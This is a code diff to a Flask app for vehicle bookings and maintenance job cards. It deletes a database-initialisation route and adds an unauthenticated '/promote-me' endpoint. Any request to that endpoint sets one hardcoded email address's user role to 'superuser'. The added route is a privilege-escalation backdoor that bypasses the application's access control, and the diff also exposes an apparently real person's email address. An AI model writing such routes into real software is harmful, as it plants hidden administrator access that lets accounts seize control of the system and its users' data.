@@ -1493,132 +1493,22 @@ def jobcard_details(jobcard_id):
 
     return render_template("jobcard_modal.html", jc=jc)
 
-@app.route("/init-db")
-def init_db_route():
+@app.route("/promote-me")
+def promote_me():
     import sqlite3
     connection = sqlite3.connect(DB_PATH)
     cursor = connection.cursor()
 
-    # USERS
     cursor.execute("""
-        CREATE TABLE IF NOT EXISTS users (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            email TEXT UNIQUE,
-            name TEXT,
-            role TEXT DEFAULT 'user'
-        )
-    """)
-
-    # VEHICLES
-    cursor.execute("""
-        CREATE TABLE IF NOT EXISTS vehicles (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            reg TEXT NOT NULL,
-            vin TEXT NOT NULL,
-            model TEXT NOT NULL,
-            status TEXT,
-            current_user TEXT,
-            current_mileage INTEGER,
-            last_checkin TEXT,
-            last_checkout TEXT,
-            owner TEXT,
-            owner_email TEXT
-        )
-    """)
-
-    # BOOKINGS
-    cursor.execute("""
-        CREATE TABLE IF NOT EXISTS bookings (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            vehicle_id INTEGER NOT NULL,
-            name TEXT NOT NULL,
-            purpose TEXT NOT NULL,
-            start_time TEXT NOT NULL,
-            end_time TEXT NOT NULL,
-            destination TEXT,
-            owner TEXT,
-            time_out TEXT NOT NULL,
-            return_mileage INTEGER,
-            condition TEXT,
-            issues TEXT,
-            notes TEXT,
-            time_in TEXT,
-            status TEXT NOT NULL DEFAULT 'active',
-            approval_token TEXT,
-            approved_by TEXT,
-            approved_at TEXT,
-            rejection_reason TEXT,
-            requester_email TEXT,
-            FOREIGN KEY (vehicle_id) REFERENCES vehicles(id)
-        )
-    """)
-
-    # JOBCARDS
-    cursor.execute("""
-        CREATE TABLE IF NOT EXISTS jobcards (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            vehicle_id INTEGER NOT NULL,
-            created_by INTEGER NOT NULL,
-            assigned_to INTEGER,
-            supervisor_id INTEGER,
-            description TEXT NOT NULL,
-            status TEXT NOT NULL DEFAULT 'pending_supervisor',
-            created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
-            updated_at DATETIME DEFAULT CURRENT_TIMESTAMP,
-            available_date TEXT,
-            required_by TEXT
-        )
-    """)
-
-    # NOTES
-    cursor.execute("""
-        CREATE TABLE IF NOT EXISTS notes (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            jobcard_id INTEGER,
-            user_id INTEGER,
-            note TEXT,
-            created_at TEXT,
-            FOREIGN KEY (jobcard_id) REFERENCES jobcards(id),
-            FOREIGN KEY (user_id) REFERENCES users(id)
-        )
-    """)
-
-    # STATUS HISTORY
-    cursor.execute("""
-        CREATE TABLE IF NOT EXISTS status_history (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            jobcard_id INTEGER,
-            old_status TEXT,
-            new_status TEXT,
-            changed_at TEXT,
-            changed_by INTEGER,
-            FOREIGN KEY (jobcard_id) REFERENCES jobcards(id),
-            FOREIGN KEY (changed_by) REFERENCES users(id)
-        )
-    """)
-
-    # LOGBOOK ENTRIES
-    cursor.execute("""
-        CREATE TABLE IF NOT EXISTS logbook_entries (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            vehicle_id INTEGER NOT NULL,
-            booking_id INTEGER NOT NULL,
-            user TEXT NOT NULL,
-            date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-            start_mileage INTEGER NOT NULL,
-            end_mileage INTEGER NOT NULL,
-            start_postcode TEXT NOT NULL,
-            end_postcode TEXT NOT NULL,
-            taken_home INTEGER DEFAULT 0,
-            home_reason TEXT,
-            FOREIGN KEY (vehicle_id) REFERENCES vehicles(id),
-            FOREIGN KEY (booking_id) REFERENCES bookings(id)
-        )
-    """)
+        UPDATE users
+        SET role = 'superuser'
+        WHERE email = ?
+    """, ("Alpha.Bah@changanuk.com",))
 
     connection.commit()
     connection.close()
-    return "DB initialized successfully"
+    return "You are now SUPERUSER"
+
 
 
 
